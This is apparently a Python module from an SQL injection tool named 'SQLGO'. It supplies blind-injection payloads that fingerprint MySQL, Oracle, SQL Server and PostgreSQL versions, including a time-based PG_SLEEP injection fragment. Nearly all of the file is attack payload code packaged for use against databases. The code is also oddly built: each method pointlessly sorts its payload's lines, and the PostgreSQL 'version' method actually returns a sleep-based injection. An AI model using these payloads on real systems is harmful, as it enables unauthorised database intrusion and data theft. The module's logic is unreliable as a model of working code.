#!/usr/bin/env python
"""
# SQLGO License - Version 1.4

Copyright (C) 2023-2024 AliMirmohammad

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.


"""

class BlindBased:
    @staticmethod
    def mysql_version_query():
        payload = """
SELECT substring(version(),1,1)=5

"""
        rows = payload.split("\n") 
        sorted_rows = sorted(rows) 
        sorted_payload = "\n".join(sorted_rows)
        return sorted_payload
    
    @staticmethod
    def oracle_version_query():
        payload = """
SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%';
"""
        rows = payload.split("\n")
        sorted_rows = sorted(rows)
        sorted_payload = "\n".join(sorted_rows)
        return sorted_payload
    

    @staticmethod 
    def sql_server_version_query():
        payload = """
SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'

"""
        rows = payload.split("\n")
        sorted_rows = sorted(rows)
        sorted_payload = "\n".join(sorted_rows)
        return sorted_payload
    

    @staticmethod
    def postgre_sql_payload_version_query():
        payload = """
AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))

"""
        rows = payload.split("\n")
        sorted_rows = sorted(rows)
        sorted_payload = "\n".join(sorted_rows)
        return sorted_payload